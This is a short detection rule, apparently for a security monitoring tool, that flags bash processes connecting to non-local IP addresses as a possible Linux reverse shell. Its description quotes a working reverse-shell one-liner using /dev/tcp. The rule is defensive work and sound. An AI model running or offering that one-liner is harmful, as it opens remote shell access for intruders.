ruleDefinitions.name: Linux Reverse Shell Indicator
ruleDefinitions.description: Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')

sequences.query: process_path = RGX("\\/bin\\/bash$") AND  NOT ((dest_ip = "127\.0\.0\.1" OR dest_ip = "0\.0\.0\.0"))
